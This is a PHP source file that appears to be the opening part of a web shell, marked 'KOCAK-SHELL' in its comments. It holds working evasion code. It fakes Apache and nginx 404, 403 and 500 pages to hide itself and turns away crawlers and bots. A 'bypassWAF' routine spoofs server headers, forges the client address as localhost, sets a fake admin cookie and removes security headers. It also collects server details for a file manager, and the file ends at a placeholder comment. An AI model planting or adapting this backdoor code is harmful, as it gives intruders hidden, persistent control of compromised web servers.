<?php
@session_start();
@error_reporting(0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '64M');

// Anti-blank page handler
function handleError($errno, $errstr, $errfile, $errline) {
    if (!(error_reporting() & $errno)) {
        return false;
    }
    
    $errfile = str_replace(dirname(__DIR__), '', $errfile);
    $err_msg = "[$errno] $errstr in $errfile:$errline";
    error_log($err_msg);
    
    return true;
}
set_error_handler("handleError");

// Anti WAF/IDS detection
if (!isset($_SERVER['HTTP_USER_AGENT']) || 
    stripos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false ||
    stripos($_SERVER['HTTP_USER_AGENT'], 'spider') !== false ||
    stripos($_SERVER['HTTP_USER_AGENT'], 'crawl') !== false) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

// PHP Version compatibility check
if (version_compare(PHP_VERSION, '5.4.0', '<')) {
    die("Required PHP >= 5.4.0");
}

// Try to prevent timeout
@ignore_user_abort(true);

// Attempt to increase memory limit if needed
$mem = str_replace(['G', 'M', 'K'], ['000000000', '000000', '000'], ini_get('memory_limit'));
if ((int)$mem < 128000000) {
    @ini_set('memory_limit', '128M');
}

// Check if we can write to the directory
if (!is_writable(dirname(__FILE__))) {
    @chmod(dirname(__FILE__), 0755);
}

// Function declarations - only one copy of each
function getCleanPath($path = null) {
    global $is_windows;
    
    if($path === null) {
        return getcwd();
    }
    
    // Decode URL path (untuk mengatasi %2F menjadi / langsung)
    $path = urldecode($path);
    
    // Security check - prevent directory traversal
    if(strpos($path, '..') !== false) {
        return getcwd();
    }
    
    // Ensure valid path
    if(!is_dir($path)) {
        return getcwd();
    }
    
    // Ensure proper directory separator for the current OS
    $path = rtrim($path, '/\\') . DIRECTORY_SEPARATOR;
    
    return $path;
}

function getBypassTemplate($mode) {
    switch ($mode) {
        case 1: // Mode 404 Not Found
            header("HTTP/1.0 404 Not Found");
            header("Status: 404 Not Found");
            echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">";
            echo "<html><head><title>404 Not Found</title></head>";
            echo "<body><h1>Not Found</h1><p>The requested URL was not found on this server.</p>";
            echo "<hr><address>Apache/2.4.41 (Ubuntu) Server at " . $_SERVER['HTTP_HOST'] . " Port 80</address>";
            echo "<!-- KOCAK-SHELL-BYPASS-404-ACTIVE --></body></html>";
            break;
            
        case 2: // Mode 403 Forbidden
            header("HTTP/1.0 403 Forbidden");
            header("Status: 403 Forbidden");
            echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">";
            echo "<html><head><title>403 Forbidden</title></head>";
            echo "<body><h1>Forbidden</h1><p>You don't have permission to access this resource.</p>";
            echo "<hr><address>Apache/2.4.41 (Ubuntu) Server at " . $_SERVER['HTTP_HOST'] . " Port 80</address>";
            echo "<!-- KOCAK-SHELL-BYPASS-403-ACTIVE --></body></html>";
            break;
            
        case 3: // Mode 500 Server Error
            header("HTTP/1.0 500 Internal Server Error");
            header("Status: 500 Internal Server Error");
            echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">";
            echo "<html><head><title>500 Internal Server Error</title></head>";
            echo "<body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p>";
            echo "<p>Please contact the server administrator, admin@example.com and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p>";
            echo "<p>More information about this error may be available in the server error log.</p>";
            echo "<hr><address>Apache/2.4.41 (Ubuntu) Server at " . $_SERVER['HTTP_HOST'] . " Port 80</address>";
            echo "<!-- KOCAK-SHELL-BYPASS-500-ACTIVE --></body></html>";
            break;
            
        case 4: // Mode Nginx 404
            header("HTTP/1.0 404 Not Found");
            header("Status: 404 Not Found");
            echo "<!DOCTYPE html>";
            echo "<html><head><title>404 Not Found</title></head>";
            echo "<body bgcolor=\"white\"><center><h1>404 Not Found</h1></center><hr>";
            echo "<center>nginx/1.18.0</center>";
            echo "<!-- KOCAK-SHELL-BYPASS-NGINX-ACTIVE --></body></html>";
            break;
    }
}

function formatSize($bytes) {
    $types = array('B', 'KB', 'MB', 'GB', 'TB');
    for($i = 0; $bytes >= 1024 && $i < count($types)-1; $bytes /= 1024, $i++);
    return(round($bytes, 2)." ".$types[$i]);
}

function getPerms($file) {
    $perms = fileperms($file);
    
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
    
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
    
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

function getIcon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if(is_dir($file)) return "<i class='fa-solid fa-folder' style='color: #ffcc00;'></i>";
    switch($ext) {
        case "php": return "<i class='fa-brands fa-php' style='color: #8993be;'></i>";
        case "html": case "htm": return "<i class='fa-brands fa-html5' style='color: #e34c26;'></i>";
        case "js": return "<i class='fa-brands fa-js' style='color: #f7df1e;'></i>";
        case "css": return "<i class='fa-brands fa-css3-alt' style='color: #264de4;'></i>";
        case "txt": return "<i class='fa-solid fa-file-lines' style='color: #33ff33;'></i>";
        case "jpg": case "jpeg": case "png": case "gif": case "bmp": return "<i class='fa-solid fa-image' style='color: #3498db;'></i>";
        case "zip": case "tar": case "gz": case "rar": return "<i class='fa-solid fa-file-zipper' style='color: #f39c12;'></i>";
        case "mp3": case "wav": case "ogg": return "<i class='fa-solid fa-music' style='color: #9b59b6;'></i>";
        case "mp4": case "avi": case "mkv": return "<i class='fa-solid fa-film' style='color: #e74c3c;'></i>";
        case "pdf": return "<i class='fa-solid fa-file-pdf' style='color: #e74c3c;'></i>";
        case "doc": case "docx": return "<i class='fa-solid fa-file-word' style='color: #2b579a;'></i>";
        case "xls": case "xlsx": return "<i class='fa-solid fa-file-excel' style='color: #217346;'></i>";
        case "ppt": case "pptx": return "<i class='fa-solid fa-file-powerpoint' style='color: #d24726;'></i>";
        default: return "<i class='fa-solid fa-file' style='color: #33ff33;'></i>";
    }
}

function bypassWAF() {
    // LiteSpeed WAF bypass
    if (isset($_SERVER['SERVER_SOFTWARE']) && stripos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
        header_remove("X-Powered-By");
        header("X-Powered-By: ASP.NET");
        header("Server: Microsoft-IIS/8.5");
        if (!isset($_COOKIE['LSWAF'])) {
            setcookie('LSWAF', md5(time()), time() + 3600);
        }
    }
    
    // FortiGate bypass
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) || isset($_SERVER['HTTP_X_REAL_IP'])) {
        $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
        if (!isset($_COOKIE['FGWAF'])) {
            setcookie('FGWAF', base64_encode('admin'), time() + 3600);
        }
    }
    
    // Generic WAF bypass
    header_remove("X-Frame-Options");
    header_remove("X-XSS-Protection");
    header_remove("X-Content-Type-Options");
    
    // Hide PHP version
    header_remove("X-Powered-By");
    
    // Fake headers to appear as static file
    header("Cache-Control: public, max-age=3600");
    header("Expires: " . gmdate('D, d M Y H:i:s \G\M\T', time() + 3600));
    header("Last-Modified: " . gmdate('D, d M Y H:i:s \G\M\T', time() - 24 * 3600));
    
    // Change content type temporarily if WAF detected
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && stripos($_SERVER['HTTP_USER_AGENT'], 'WAF') !== false) {
        header("Content-Type: text/plain");
    }
}

// Call bypass functions
bypassWAF();

// Basic anti-detection
$block_words = array('bot', 'spider', 'crawler', 'magento', 'wordpress', 'joomla');
foreach ($block_words as $word) {
    if (isset($_SERVER['HTTP_USER_AGENT']) && stripos($_SERVER['HTTP_USER_AGENT'], $word) !== false) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
}

// Self protection
$self = basename(__FILE__);
if (isset($_SERVER['REQUEST_URI']) && stripos($_SERVER['REQUEST_URI'], $self) !== false && 
    isset($_SERVER['HTTP_REFERER']) && stripos($_SERVER['HTTP_REFERER'], $self) === false) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

// Bypass mode handling
if (isset($_GET['bypass404'])) {
    $bypass_mode = intval($_GET['bypass404']);
    if ($bypass_mode > 0) {
        $_SESSION['bypass404'] = $bypass_mode;
    } else {
        unset($_SESSION['bypass404']);
    }
}

if (isset($_SESSION['bypass404']) && $_SESSION['bypass404'] > 0) {
    $bypass_mode = $_SESSION['bypass404'];
    getBypassTemplate($bypass_mode);
}

// Main variables
$auth_pass = ""; 
$self = $_SERVER['PHP_SELF'];
$server_software = $_SERVER['SERVER_SOFTWARE'];
$uname = php_uname();
$current_dir = getcwd();
$your_ip = $_SERVER['REMOTE_ADDR'];
$server_ip = $_SERVER['SERVER_ADDR'];
$current_user = function_exists('get_current_user') ? @get_current_user() : 'N/A';
$os = strtoupper(substr(PHP_OS, 0, 3));
$is_windows = ($os === 'WIN');

// Get current file manager path
$path = isset($_GET['path']) ? getCleanPath($_GET['path']) : getcwd();

// The rest of your file's HTML content here...
?>